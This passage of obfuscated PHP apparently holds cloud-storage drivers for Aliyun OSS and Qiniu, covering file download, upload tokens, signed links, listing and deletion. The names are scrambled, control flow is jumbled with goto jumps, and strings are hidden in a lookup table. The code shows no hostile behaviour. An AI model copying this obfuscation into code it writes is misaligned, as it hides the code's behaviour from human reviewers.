$Bù©óÎÂ»“[113])); } goto Fæ≥Œ∫Û’“; d—©ﬂîí´°: } public function download($a∆º” π–∏, $c°îôåŒ˘ò) { if ($this->isFolder($a∆º” π–∏)) { return !1; } try { $d˘ÛÎòÿÊô = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $c°îôåŒ˘ò); $d˘ÛÎòÿÊô = $this->trafficLimit($_SERVER[—Ω][105], $d˘ÛÎòÿÊô); $this->client->getObject($this->bucket, $this->pathEncode($a∆º” π–∏), $d˘ÛÎòÿÊô); } catch (OSS\Core\OssException $dù˘√Ñ˘ü¬) { return !1; } return $c°îôåŒ˘ò; } public function fileSubstr($DÎ±™ŒâÉ¬, $e¿ÒâÛìßé = 0, $CÎ≥á†â•ƒ = false) { if ($e¿ÒâÛìßé === -1) { $Déä—¬œåã = array(); } else { if ($CÎ≥á†â•ƒ === !1) { $aÏÑ¡†«´ø = $this->size($DÎ±™ŒâÉ¬); } else { $aÏÑ¡†«´ø = $e¿ÒâÛìßé + $CÎ≥á†â•ƒ - 1; } $Déä—¬œåã = array(OSS\OssClient::OSS_RANGE => "{$e¿ÒâÛìßé}\55{$aÏÑ¡†«´ø}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($DÎ±™ŒâÉ¬), $Déä—¬œåã); } catch (OSS\Core\OssException $B≈Ì£ »õ’) { think_exception($B≈Ì£ »õ’->getMessage()); return !1; } } private function trafficLimit($Bóñ§Ùö‰Ñ, $EÃ¶ß∆˘Îó = array()) { goto DìùΩáä‹; DìùΩáä‹: $Bë°∆à∂Úµ =& $_SERVER[—Ω]; if ($Bóñ§Ùö‰Ñ == $Bë°∆à∂Úµ[1193] && $this->isUploadServer() || $Bóñ§Ùö‰Ñ == $Bë°∆à∂Úµ[105] && $this->isFileOutServer()) { return $EÃ¶ß∆˘Îó; } $eß◊âç¯ê« = floatval($GLOBALS[$Bë°∆à∂Úµ[6]][$Bë°∆à∂Úµ[84]][$Bë°∆à∂Úµ[91]][$Bóñ§Ùö‰Ñ]) * 1024 * 1024 * 8; goto Aê∂ï∞Æ∆û; d¥ÏèèÆ∏≥: return $EÃ¶ß∆˘Îó; goto Fí√øçè…Ï; Aê∂ï∞Æ∆û: if (!$eß◊âç¯ê«) { return $EÃ¶ß∆˘Îó; } $eß◊âç¯ê« = $eß◊âç¯ê« < 819200 ? 819200 : ($eß◊âç¯ê« > 838860800 ? 838860800 : $eß◊âç¯ê«); $EÃ¶ß∆˘Îó[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($eß◊âç¯ê«); goto d¥ÏèèÆ∏≥; Fí√øçè…Ï: } public function link($c±ä’‡çÀÜ, $F•√πÙ◊€ú = array()) { $E˘ÙÊè‡Æ˜ =& $_SERVER[—Ω]; if (!$this->exist($c±ä’‡çÀÜ) || $this->isFolder($c±ä’‡çÀÜ)) { return !1; } try { $F•√πÙ◊€ú = $this->trafficLimit($E˘ÙÊè‡Æ˜[105], $F•√πÙ◊€ú); $DÖ‚÷¿ë·€ = $this->client->signUrl($this->bucket, $this->pathEncode($c±ä’‡çÀÜ), 3600 * 12, $E˘ÙÊè‡Æ˜[213], $F•√πÙ◊€ú); return $this->getCdnLink($DÖ‚÷¿ë·€); } catch (OSS\Core\OssException $cÙ‰‚€ìçß) { return !1; } } public function fileOut($aœ¬ØŒÇÜ±, $e£‘ÛëÍç∂ = false, $bë®≥ Æ˘— = false, $DÑ˜•∫ÜÿÇ = '') { goto cñØ¯åçÏ—; cñØ¯åçÏ—: $F¨õíï§¯ˆ =& $_SERVER[—Ω]; if (!$bë®≥ Æ˘—) { $bë®≥ Æ˘— = $this->pathThis($aœ¬ØŒÇÜ±); } $bë®≥ Æ˘— = rawurlencode($bë®≥ Æ˘—); goto fûŒ–œñÁê; aíÇÉ‰òÇÛ: $e∑ëíÇá‚å = array(OSS\OssClient::OSS_SUB_RESOURCE => $F¨õíï§¯ˆ[1205] . rawurlencode("{$e£‘ÛëÍç∂}\73\146\151\154\x65\x6e\141\x6d\145\75{$bë®≥ Æ˘—}")); $e∑ëíÇá‚å[OSS\OssClient::OSS_SUB_RESOURCE] .= $F¨õíï§¯ˆ[1206] . $aˆ°¯¿–Æ≈; $Eã≤ üŒÿ† = $this->link($aœ¬ØŒÇÜ±, $e∑ëíÇá‚å); goto fËªïâ¿åÙ; fËªïâ¿åÙ: $this->fileOutLink($Eã≤ üŒÿ†); goto fûˆŒÆÓ∂ä; fûŒ–œñÁê: $aˆ°¯¿–Æ≈ = get_file_mime(get_path_ext($bë®≥ Æ˘—)); if ($aˆ°¯¿–Æ≈ == $F¨õíï§¯ˆ[198]) { return parent::fileOut($aœ¬ØŒÇÜ±, $e£‘ÛëÍç∂, $bë®≥ Æ˘—, $DÑ˜•∫ÜÿÇ); } $e£‘ÛëÍç∂ = $e£‘ÛëÍç∂ ? $F¨õíï§¯ˆ[199] : $F¨õíï§¯ˆ[200]; goto aíÇÉ‰òÇÛ; fûˆŒÆÓ∂ä: } public function fileOutServer($fèÇ˜ÒÑ÷˘, $CÆÛÑÍ¡˘≥ = false, $A—›¿¨πˆä = false, $d»±Á∞ˆ∏® = '') { parent::fileOut($fèÇ˜ÒÑ÷˘, $CÆÛÑÍ¡˘≥, $A—›¿¨πˆä, $d»±Á∞ˆ∏®); } public function fileOutImage($aÉÌÉïˆ„˜, $AÈÌ•ÁÆ¿¡ = 250) { $Dö—›†∞”È = array(OSS\OssClient::OSS_PROCESS => $_SERVER[—Ω][1207] . $AÈÌ•ÁÆ¿¡); $EÂ™¯µ≠óø = $this->link($aÉÌÉïˆ„˜, $Dö—›†∞”È); $this->fileOutLink($EÂ™¯µ≠óø); } public function fileOutImageServer($F‹ãÔéÏ’í, $E”ãÑ⁄ñÓ∞ = 250) { parent::fileOutImage($F‹ãÔéÏ’í, $E”ãÑ⁄ñÓ∞); } public function fileOutLink($dàŒÒ⁄ºﬂë) { $Aÿ„’éíﬂﬁ =& $_SERVER[—Ω]; if (!$this->isCdnHost() && substr($dàŒÒ⁄ºﬂë, 0, 7) == $Aÿ„’éíﬂﬁ[1112]) { $dàŒÒ⁄ºﬂë = $Aÿ„’éíﬂﬁ[1113] . substr($dàŒÒ⁄ºﬂë, 7); } header($Aÿ„’éíﬂﬁ[153] . $dàŒÒ⁄ºﬂë); die; } public function hashMd5($B“‡ã… Ã…, $eßÙ‘Ûúéå = '') { $A¶Ûœò≈†æ =& $_SERVER[—Ω]; $A≠Û…È±π‡ = $this->objectMeta($B“‡ã… Ã…); if (!$A≠Û…È±π‡) { return $A¶Ûœò≈†æ[33]; } if (!isset($A≠Û…È±π‡[$A¶Ûœò≈†æ[1180]]) && !empty($eßÙ‘Ûúéå)) { $FÇ¬÷∞å¶á = $this->updateObjMeta($B“‡ã… Ã…, array($A¶Ûœò≈†æ[1180] => $eßÙ‘Ûúéå)); $A≠Û…È±π‡[$A¶Ûœò≈†æ[1180]] = $FÇ¬÷∞å¶á ? $eßÙ‘Ûúéå : $A¶Ûœò≈†æ[33]; } return isset($A≠Û…È±π‡[$A¶Ûœò≈†æ[1180]]) ? strtolower($A≠Û…È±π‡[$A¶Ûœò≈†æ[1180]]) : $A¶Ûœò≈†æ[33]; } public function size($cêÑµ“ÛÑã) { $AÿÔ†·Úïé = $this->objectMeta($cêÑµ“ÛÑã); return $AÿÔ†·Úïé ? $AÿÔ†·Úïé[$_SERVER[—Ω][77]] : 0; } public function info($d◊⁄–µè·¥) { if ($this->isFolder($d◊⁄–µè·¥)) { return $this->folderInfo($d◊⁄–µè·¥); } else { if ($this->isFile($d◊⁄–µè·¥)) { return $this->fileInfo($d◊⁄–µè·¥); } } return !1; } public function exist($fåâºÓºıÛ) { return $this->isFile($fåâºÓºıÛ) || $this->isFolder($fåâºÓºıÛ); } public function isFile($eèñ…≠’Ê”) { return !$this->isFolder($eèñ…≠’Ê”) && $this->objectMeta($eèñ…≠’Ê”); } public function isFolder($d‡Û©ã¢”’) { return $this->cacheMethod($_SERVER[—Ω][220], $d‡Û©ã¢”’); } protected function objectMeta($f¥ÙÌ∑≠îï) { return $this->cacheMethod($_SERVER[—Ω][221], $f¥ÙÌ∑≠îï); } protected function _objectMeta($B∏Ñ¡ä≈Ö≠) { $FêºÓ¥©äÁ =& $_SERVER[—Ω]; try { $A¡°ìãƒ∂Ö = $this->client->getObjectMeta($this->bucket, $this->pathEncode($B∏Ñ¡ä≈Ö≠)); } catch (OSS\Core\OssException $d™éÛÑ£âµ) { $A¡°ìãƒ∂Ö = !1; } if ($A¡°ìãƒ∂Ö) { $A¡°ìãƒ∂Ö[$FêºÓ¥©äÁ[77]] = intval($A¡°ìãƒ∂Ö[$FêºÓ¥©äÁ[1187]]); } return $A¡°ìãƒ∂Ö; } protected function _isFolder($a¥ıùà˘ãâ) { $Aâ£ˆàî≠¬ =& $_SERVER[—Ω]; if ($a¥ıùà˘ãâ == $Aâ£ˆàî≠¬[33] || $a¥ıùà˘ãâ == $Aâ£ˆàî≠¬[8]) { return !0; } $FÇøøúËŸÂ = array($Aâ£ˆàî≠¬[1177] => $Aâ£ˆàî≠¬[8], $Aâ£ˆàî≠¬[183] => rtrim($a¥ıùà˘ãâ, $Aâ£ˆàî≠¬[8]) . $Aâ£ˆàî≠¬[8], $Aâ£ˆàî≠¬[1178] => 1, $Aâ£ˆàî≠¬[1179] => $Aâ£ˆàî≠¬[33]); $F≥¶‰∏Ûè∏ = $this->client->listObjects($this->bucket, $FÇøøúËŸÂ); if ($F≥¶‰∏Ûè∏->getObjectList() || $F≥¶‰∏Ûè∏->getPrefixList()) { return !0; } return !1; } } class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $config = null; protected $bucketManager = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\x30"; public function __construct($eÀûïﬂ≠êÛ) { parent::__construct(); require_once SDK_DIR . $_SERVER[—Ω][1208]; $this->_init($eÀûïﬂ≠êÛ); } public function _init($Cßô—è˜¢£) { foreach ($Cßô—è˜¢£ as $Aê®è§´á° => $DÆÊ’‘‡í·) { if (isset($this->{$Aê®è§´á°})) { $this->{$Aê®è§´á°} = $DÆÊ’‘‡í·; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { show_json($_SERVER[—Ω][1209], !1); } $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->config = new \Qiniu\Config(); $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->config); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($eõû…€ê≠√, $A›≠‰´°õΩ = '', $bô“≤Ú¨≠ﬁ = REPEAT_RENAME) { if ($this->setContent($eõû…€ê≠√, $A›≠‰´°õΩ)) { return $this->getPathOuter($eõû…€ê≠√); } return !1; } public function mkdir($aêÚ¶¢∫ë∏, $eÊÈÁÂùïù = REPEAT_SKIP) { goto dêÖ«ÒìÚø; e∞¬Ûí±Ñë: $aêÚ¶¢∫ë∏ = $FûÖºçÌ”© . $DÔ¬⁄ÑŸ”à[8]; $FâÉÍÜü¥Ú = get_path_this($FûÖºçÌ”©); $C™™óÙ’ä· = $aêÚ¶¢∫ë∏ . $FâÉÍÜü¥Ú; goto bî¨‹ƒ‡∏≠; dêÖ«ÒìÚø: $DÔ¬⁄ÑŸ”à =& $_SERVER[—Ω]; $FûÖºçÌ”© = trim($aêÚ¶¢∫ë∏, $DÔ¬⁄ÑŸ”à[8]); if ($this->_isFolder($FûÖºçÌ”©)) { return $this->getPathOuter($FûÖºçÌ”©); } goto e∞¬Ûí±Ñë; bî¨‹ƒ‡∏≠: if (!$this->mkfile($C™™óÙ’ä·)) { return !1; } if (!$this->moveFile($C™™óÙ’ä·, $aêÚ¶¢∫ë∏)) { $this->delFile($C™™óÙ’ä·); return !1; } return $this->getPathOuter($FûÖºçÌ”©); goto cÊ≈Ω”Ñ √; cÊ≈Ω”Ñ √: } public function copyFile($e´ä˜ê≥Ñà, $Cœàè®ÉâŒ) { $CÑ„î·†–û = $this->bucketManager->copy($this->bucket, $e´ä˜ê≥Ñà, $this->bucket, $Cœàè®ÉâŒ, !0); return $CÑ„î·†–û ? !1 : !0; } public function moveFile($f±èüÁñ˜‡, $eı∫–îÀíî) { $B¢Üòë†Çä = $this->bucketManager->move($this->bucket, $f±èüÁñ˜‡, $this->bucket, $eı∫–îÀíî, !0); return $B¢Üòë†Çä ? !1 : !0; } public function delFile($D∫‹ò≠‹∑ﬂ) { $AÆÇå»Í≠† = $this->bucketManager->delete($this->bucket, $D∫‹ò≠‹∑ﬂ); return $AÆÇå»Í≠† ? !1 : !0; } public function delFolder($FÙñÌù©ÂŸ) { $côœ∂¬â†Õ = $this->fileList($FÙñÌù©ÂŸ); if (empty($côœ∂¬â†Õ)) { return !0; } $d¨Çá¬ÇŸÇ = 1000; if (count($côœ∂¬â†Õ) <= $d¨Çá¬ÇŸÇ) { return $this->qnDelObj($côœ∂¬â†Õ) ? !1 : !0; } foreach (array_chunk($côœ∂¬â†Õ, $d¨Çá¬ÇŸÇ) as $aÓàÖ‹”§ä) { $F•¬ÂæÔåå = $this->qnDelObj($aÓàÖ‹”§ä); if ($F•¬ÂæÔåå) { return !1; } } return !0; } private function qnDelObj($dé¿§’òû€) { $E‘±ØŒÉ±ë = $this->bucketManager->buildBatchDelete($this->bucket, $dé¿§’òû€); list($f≠€—åπã·, $D„ë≠£«Ó‘) = $this->bucketManager->batch($E‘±ØŒÉ±ë); return $D„ë≠£«Ó‘; } private function fileList($FÃ‹∆¯úƒî, $EÀ§¯¬∏Øç = 0) { goto b€¬¨∆‰Óá; DπÂÜÍ≤œÆ: $EÌê’–È€ö = $fπ©ãØ¯Íâ[33]; $aáˆΩœÇø„ = 1000; $cπˆí√¨¥Ê = $fπ©ãØ¯Íâ[33]; goto bŸû≥…˘¡÷; b€¬¨∆‰Óá: $fπ©ãØ¯Íâ =& $_SERVER[—Ω]; $FÃ‹∆¯úƒî = trim($FÃ‹∆¯úƒî, $fπ©ãØ¯Íâ[8]); $B¶¢àƒÉıÛ = empty($FÃ‹∆¯úƒî) ? $fπ©ãØ¯Íâ[33] : $FÃ‹∆¯úƒî . $fπ©ãØ¯Íâ[8]; goto DπÂÜÍ≤œÆ; bŸû≥…˘¡÷: $CÖŸ®∞«¯Ã = array(); while (!0) { list($aúºœ≥ÎÑ, $fäÃµÆ÷≤û) = $this->bucketManager->listFiles($this->bucket, $B¶¢àƒÉıÛ, $EÌê’–È€ö, $aáˆΩœÇø„, $cπˆí√¨¥Ê); if ($fäÃµÆ÷≤û) { return !1; } $EÌê’–È€ö = array_key_exists($fπ©ãØ¯Íâ[1179], $aúºœ≥ÎÑ) ? $EÌê’–È€ö = $aúºœ≥ÎÑ[$fπ©ãØ¯Íâ[1210]] : $fπ©ãØ¯Íâ[33]; foreach ($aúºœ≥ÎÑ[$fπ©ãØ¯Íâ[1211]] as $BøÌí◊’Éç) { $aÁ¬ƒ‚§ˆÇ = $BøÌí◊’Éç[$fπ©ãØ¯Íâ[89]]; if ($EÀ§¯¬∏Øç) { $aÁ¬ƒ‚§ˆÇ = array($fπ©ãØ¯Íâ[28] => $aÁ¬ƒ‚§ˆÇ, $fπ©ãØ¯Íâ[77] => $BøÌí◊’Éç[$fπ©ãØ¯Íâ[1212]]); } $CÖŸ®∞«¯Ã[] = $aÁ¬ƒ‚§ˆÇ; } if ($EÌê’–È€ö == $fπ©ãØ¯Íâ[33]) { break; } } return $CÖŸ®∞«¯Ã; goto cÙÔÑ†œ¢⁄; cÙÔÑ†œ¢⁄: } public function rename($BÔ¨ÿ‹íÂ¥, $A∂äáî˜ŒÌ) { return $this->renameObject($BÔ¨ÿ‹íÂ¥, $A∂äáî˜ŒÌ); } public function fileInfo($F˘„˘¨Ü±∂, $F°ªœôëÊ÷ = false, $E£ƒ‚ùèßê = array()) { goto Däî¿˘ìì; cÈ£¡ÛËœ§: if (empty($E£ƒ‚ùèßê)) { $E£ƒ‚ùèßê = $this->objectMeta($F˘„˘¨Ü±∂); if (!$E£ƒ‚ùèßê) { return $eƒ¥∞í≈äÑ; } } if (isset($E£ƒ‚ùèßê[$Bä»íüÕèù[1213]])) { $eƒ¥∞í≈äÑ[$Bä»íüÕèù[184]] = $E£ƒ‚ùèßê[$Bä»íüÕèù[1213]]; } if (isset($E£ƒ‚ùèßê[$Bä»íüÕèù[1212]])) { $eƒ¥∞í≈äÑ[$Bä»íüÕèù[77]] = $E£ƒ‚ùèßê[$Bä»íüÕèù[1212]]; } goto cîâ‘“ò÷⁄; Däî¿˘ìì: $Bä»íüÕèù =& $_SERVER[—Ω]; if ($F°ªœôëÊ÷) { return array($Bä»íüÕèù[28] => $this->pathThis($F˘„˘¨Ü±∂), $Bä»íüÕèù[75] => $this->getPathOuter($Bä»íüÕèù[8] . $F˘„˘¨Ü±∂), $Bä»íüÕèù[29] => $Bä»íüÕèù[164], $Bä»íüÕèù[77] => isset($E£ƒ‚ùèßê[$Bä»íüÕèù[1212]]) ? $E£ƒ‚ùèßê[$Bä»íüÕèù[1212]] : 0, $Bä»íüÕèù[157] => $this->ext($F˘„˘¨Ü±∂)); } $eƒ¥∞í≈äÑ = array($Bä»íüÕèù[28] => $this->pathThis($F˘„˘¨Ü±∂), $Bä»íüÕèù[75] => $this->getPathOuter($Bä»íüÕèù[8] . $F˘„˘¨Ü±∂), $Bä»íüÕèù[29] => $Bä»íüÕèù[164], $Bä»íüÕèù[184] => 0, $Bä»íüÕèù[107] => 0, $Bä»íüÕèù[77] => 0, $Bä»íüÕèù[157] => $this->ext($F˘„˘¨Ü±∂), $Bä»íüÕèù[185] => !0, $Bä»íüÕèù[186] => !0); goto cÈ£¡ÛËœ§; cîâ‘“ò÷⁄: return $eƒ¥∞í≈äÑ; goto fâ·áºÍŒ—; fâ·áºÍŒ—: } public function folderInfo($CªøÌ¥¥Æ˘, $EºÆœÜ∫ú˘ = false) { goto fùÈÏ„ÕÎÛ; a«§•€∫Üﬁ: $CªøÌ¥¥Æ˘ = rtrim($CªøÌ¥¥Æ˘, $F¢†õ≈üÕß[8]) . $F¢†õ≈üÕß[8]; $cî ÕáÈÈ° = $this->objectMeta($CªøÌ¥¥Æ˘); if (isset($cî ÕáÈÈ°[$F¢†õ≈üÕß[1213]])) { $BÚâŒ‹Ñ…ﬁ[$F¢†õ≈üÕß[184]] = $cî ÕáÈÈ°[$F¢†õ≈üÕß[1213]]; } goto CÈñÎÇä©˘; CÈñÎÇä©˘: return $BÚâŒ‹Ñ…ﬁ; goto fùñ™µâëë; fùÈÏ„ÕÎÛ: $F¢†õ≈üÕß =& $_SERVER[—Ω]; if ($EºÆœÜ∫ú˘) { return array($F¢†õ≈üÕß[28] => $this->pathThis($CªøÌ¥¥Æ˘), $F¢†õ≈üÕß[75] => $this->getPathOuter($F¢†õ≈üÕß[8] . $CªøÌ¥¥Æ˘), $F¢†õ≈üÕß[29] => $F¢†õ≈üÕß[76]); } $BÚâŒ‹Ñ…ﬁ = array($F¢†õ≈üÕß[28] => $this->pathThis($CªøÌ¥¥Æ˘), $F¢†õ≈üÕß[75] => $this->getPathOuter($F¢†õ≈üÕß[8] . $CªøÌ¥¥Æ˘), $F¢†õ≈üÕß[29] => $F¢†õ≈üÕß[76], $F¢†õ≈üÕß[184] => 0, $F¢†õ≈üÕß[107] => 0, $F¢†õ≈üÕß[1158] => !0, $F¢†õ≈üÕß[1159] => !0); goto a«§•€∫Üﬁ; fùñ™µâëë: } public function listPath($Dœ˜Ì›ñ◊¥, $FàüÎ•—ˆ° = false) { goto b∑æàÊªÀ»; eπõ±Œ‡îê: $dÂ©ÚÒÑ±À = $B’ÜïöÕπ±[33]; $F˜◊ΩÙé™É = 1000; $a∂†’‚∏´∆ = $B’ÜïöÕπ±[8]; goto F·ŒË–¬äÍ; b∑æàÊªÀ»: $B’ÜïöÕπ± =& $_SERVER[—Ω]; $Dœ˜Ì›ñ◊¥ = trim($Dœ˜Ì›ñ◊¥, $B’ÜïöÕπ±[8]); $Cãç°Àõ†§ = empty($Dœ˜Ì›ñ◊¥) ? $B’ÜïöÕπ±[33] : $Dœ˜Ì›ñ◊¥ . $B’ÜïöÕπ±[8]; goto eπõ±Œ‡îê; F·ŒË–¬äÍ: $eÔíê´—Ωº = $a¶ËøéÀµΩ = array(); while (!0) { list($f¡®ù‰Æï€, $eêı¢…ä≈“) = $this->bucketManager->listFiles($this->bucket, $Cãç°Àõ†§, $dÂ©ÚÒÑ±À, $F˜◊ΩÙé™É, $a∂†’‚∏´∆); if ($eêı¢…ä≈“) { return !1; } $dÂ©ÚÒÑ±À = array_key_exists($B’ÜïöÕπ±[1179], $f¡®ù‰Æï€) ? $dÂ©ÚÒÑ±À = $f¡®ù‰Æï€[$B’ÜïöÕπ±[1210]] : $B’ÜïöÕπ±[33]; if (isset($f¡®ù‰Æï€[$B’ÜïöÕπ±[1214]])) { foreach ($f¡®ù‰Æï€[$B’ÜïöÕπ±[1214]] as $A«Îüö≤ÈÎ) { if ($A«Îüö≤ÈÎ == $Cãç°Àõ†§) { continue; } $eÔíê´—Ωº[] = $this->folderInfo($A«Îüö≤ÈÎ, $FàüÎ•—ˆ°); } } if (isset($f¡®ù‰Æï€[$B’ÜïöÕπ±[1211]])) { foreach ($f¡®ù‰Æï€[$B’ÜïöÕπ±[1211]] as $cè£œ‘€Â‘) { if ($cè£œ‘€Â‘[$B’ÜïöÕπ±[89]] == $Cãç°Àõ†§) { continue; } $a¶ËøéÀµΩ[] = $this->fileInfo($cè£œ‘€Â‘[$B’ÜïöÕπ±[89]], $FàüÎ•—ˆ°, $cè£œ‘€Â‘); } } if ($dÂ©ÚÒÑ±À == $B’ÜïöÕπ±[33]) { break; } } return array($B’ÜïöÕπ±[74] => $eÔíê´—Ωº, $B’ÜïöÕπ±[73] => $a¶ËøéÀµΩ); goto d≠®‚∑Üï÷; d≠®‚∑Üï÷: } public function has($Bï≥¯éÊåÒ, $a™≈†òáü£ = false, $bß∑∆ÂâÎ¢ = true) { goto F–ÉÌº¢È“; b‚–Û•â©Ó: if ($a™≈†òáü£) { return array($fÆ€ôãÙèÈ[188] => $E√ªÚÔàäﬁ, $fÆ€ôãÙèÈ[189] => $f»òÍ˘Õ©§); } return !1; goto d’öéﬂÌèÿ; F–ÉÌº¢È“: $fÆ€ôãÙèÈ =& $_SERVER[—Ω]; $Bï≥¯éÊåÒ = trim($Bï≥¯éÊåÒ, $fÆ€ôãÙèÈ[8]); $EÊäêÎñÃœ = empty($Bï≥¯éÊåÒ) ? $fÆ€ôãÙèÈ[33] : $Bï≥¯éÊåÒ . $fÆ€ôãÙèÈ[8]; goto e¥ÃÛõÕ†ª; e¥ÃÛõÕ†ª: $Dèê≈É¿„Ø = $fÆ€ôãÙèÈ[33]; $F≈§éÉô™‰ = 1000; $B‘ÌÑ˜çﬁ« = $fÆ€ôãÙèÈ[8]; goto E±çîÂ—µ˘; E±çîÂ—µ˘: $E√ªÚÔàäﬁ = 0; $f»òÍ˘Õ©§ = 0; while (!0) { list($dÛàôƒ√€€, $DÍÚÀù°’Ü) = $this->bucketManager->listFiles($this->bucket, $EÊäêÎñÃœ, $Dèê≈É¿„Ø, $F≈§éÉô™‰, $B‘ÌÑ˜çﬁ«); if ($DÍÚÀù°’Ü) { return !1; } $Dèê≈É¿„Ø = array_key_exists($fÆ€ôãÙèÈ[1179], $dÛàôƒ√€€) ? $Dèê≈É¿„Ø = $dÛàôƒ√€€[$fÆ€ôãÙèÈ[1210]] : $fÆ€ôãÙèÈ[33]; if ($a™≈†òáü£) { if (!empty($dÛàôƒ√€€[$fÆ€ôãÙèÈ[1211]])) { $E√ªÚÔàäﬁ += count($dÛàôƒ√€€[$fÆ€ôãÙèÈ[1211]]); } if (!empty($dÛàôƒ√€€[$fÆ€ôãÙèÈ[1214]])) { $f»òÍ˘Õ©§ += count($dÛàôƒ√€€[$fÆ€ôãÙèÈ[1214]]); } if ($Dèê≈É¿„Ø === $fÆ€ôãÙèÈ[33]) { break; } continue; } if ($bß∑∆ÂâÎ¢) { if (!empty($dÛàôƒ√€€[$fÆ€ôãÙèÈ[1211]])) { return !0; } } else { if (!empty($dÛàôƒ√€€[$fÆ€ôãÙèÈ[1214]])) { return !0; } } if ($Dèê≈É¿„Ø == $fÆ€ôãÙèÈ[33]) { break; } } goto b‚–Û•â©Ó; d’öéﬂÌèÿ: } public function listAll($c∫¬ó‚‚Ÿ¬) { $cÀ”èÿ÷´˘ =& $_SERVER[—Ω]; $A‘Ü≥”èõò = $this->fileList($c∫¬ó‚‚Ÿ¬, 1); $dÉçöÃ–∂Õ = array(); foreach ($A‘Ü≥”èõò as $bÓÙËô±Ê–) { $dÉçöÃ–∂Õ[$bÓÙËô±Ê–[$cÀ”èÿ÷´˘[28]]] = $bÓÙËô±Ê–[$cÀ”èÿ÷´˘[77]]; } return $this->listAllFiles($c∫¬ó‚‚Ÿ¬, array_keys($dÉçöÃ–∂Õ), $dÉçöÃ–∂Õ); } public function canRead($Cù§ãçÒ∆Ô) { return $this->exist($Cù§ãçÒ∆Ô) ? !0 : !1; } public function canWrite($BãˆÖ„Ò◊ã) { return $this->exist($BãˆÖ„Ò◊ã) ? !0 : !1; } public function getContent($C€ÍËÖÔêå) { return $this->fileSubstr($C€ÍËÖÔêå, 0, -1); } public function setContent($eëÕÊî∑õ‚, $C≥‚Ùπ¥ö‰ = '') { $Aˆ‡ûöäˆ… = $this->tempFile($this->pathThis($eëÕÊî∑õ‚)); file_put_contents($Aˆ‡ûöäˆ…, $C≥‚Ùπ¥ö‰); if ($this->upload($eëÕÊî∑õ‚, $Aˆ‡ûöäˆ…)) { $this->tempFileRemve($Aˆ‡ûöäˆ…); return !0; } return !1; } public function refreshUrls($eµœÖ€ŸÑã) { goto B◊∆ïÑ»¨∆; aÎ†õÆﬂ≈ã: return $D¨Õ¢‡⁄©Ò[$b˜ÕÖ√õüô[1215]] == $b˜ÕÖ√õüô[706] ? !0 : !1; goto eë¶ﬂ®ﬂµ…; e »«ûî⁄—: $F¿ó◊√ëÖá = new Qiniu\Cdn\CdnManager($this->auth); list($D¨Õ¢‡⁄©Ò, $a¶¯ËÀÙÖµ) = $F¿ó◊√ëÖá->refreshUrls($DóûÑä⁄›°); if ($a¶¯ËÀÙÖµ) { return !1; } goto aÎ†õÆﬂ≈ã; B◊∆ïÑ»¨∆: $b˜ÕÖ√õüô =& $_SERVER[—Ω]; $DóûÑä⁄›° = array(); if (is_array($eµœÖ€ŸÑã)) { foreach ($eµœÖ€ŸÑã as $eïëò”®›º) { $DóûÑä⁄›°[] = $this->link($eïëò”®›º); } } else { $DóûÑä⁄›°[] = $this->link($eµœÖ€ŸÑã); } goto e »«ûî⁄—; eë¶ﬂ®ﬂµ…: } public function fileSubstr($AâÔﬁöûÀÜ, $C®‚á¡„«†, $D≠¬÷ëÛãµ) { $Cë¿°ÛùŸ =& $_SERVER[—Ω]; if (!($EÙÁ∑Œ∂’á = $this->link($AâÔﬁöûÀÜ))) { return !1; } $DÃ≠√ºùãÜ = !1; if ($D≠¬÷ëÛãµ > 0) { $D¨÷âéÉ≠ = $C®‚á¡„«† + $D≠¬÷ëÛãµ - 1; $DÃ≠√ºùãÜ = array($Cë¿°ÛùŸ[1216] . $C®‚á¡„«† . $Cë¿°ÛùŸ[408] . $D¨÷âéÉ≠); } $DÖ–ÃØò»à = url_request($EÙÁ∑Œ∂’á, $Cë¿°ÛùŸ[213], !1, $DÃ≠√ºùãÜ); return $DÖ–ÃØò»à[$Cë¿°ÛùŸ[699]] ? $DÖ–ÃØò»à[$Cë¿°ÛùŸ[1038]] : !1; } public function upload($Dµ“—Æ∞£Ê, $eª÷ÿ–¨◊’, $CØ√îÇ–üà = false, $aÒÇøøÈ®§ = REPEAT_REPLACE) { $cêäñ‚õÃ— = new Qiniu\Storage\UploadManager(); $bû∑ﬁ≤™÷Ú = $this->auth->uploadToken($this->bucket, $Dµ“—Æ∞£Ê); $C–ò≤Í◊˜á = get_file_mime(get_path_ext($eª÷ÿ–¨◊’)); list($bÇÃÖ∞©Â, $EçáùﬁáÊÁ) = $cêäñ‚õÃ—->putFile($bû∑ﬁ≤™÷Ú, $Dµ“—Æ∞£Ê, $eª÷ÿ–¨◊’, null, $C–ò≤Í◊˜á); return $EçáùﬁáÊÁ ? !1 : $this->getPathOuter($Dµ“—Æ∞£Ê); } public function uploadFormData($Bá¡ÕÉñªÛ, $f†ÜÒ‰ƒ¶ñ = 3600) { return $this->uploadToken($Bá¡ÕÉñªÛ, $f†ÜÒ‰ƒ¶ñ); } public function multiUploadFormData($dŒ”ﬂãô’®, $e∆ÎúÍ ÉŸ = 3600) { return $this->uploadToken($dŒ”ﬂãô’®, $e∆ÎúÍ ÉŸ); } private function uploadToken($b√ÓÊÂèßî, $B›Ç“‡ΩÁÀ = 3600) { goto fŒò§πÑÌ’; b‰‡¨∆Õ„í: $C‹©ﬁÜ–¯∏ = http_type() . "\72\57\x2f\165\160\154\157\141\x64{$B∑∞À§≈ÚÉ}\x2e\161\x69\x6e\x69\x75\160\56\143\157\155\57"; return array($Dëè∫Éóøª[1220] => $Fóº–ìä£É, $Dëè∫Éóøª[1221] => $C‹©ﬁÜ–¯∏); goto bóôÑﬁáµî; fŒò§πÑÌ’: $Dëè∫Éóøª =& $_SERVER[—Ω]; $FÖêõ≈ıû‰ = $B›Ç“‡ΩÁÀ; $Aáì¢¯‹ï≥ = array($Dëè∫Éóøª[1217] => $Dëè∫Éóøª[1218]); goto d°ƒ‘ñË„¡; 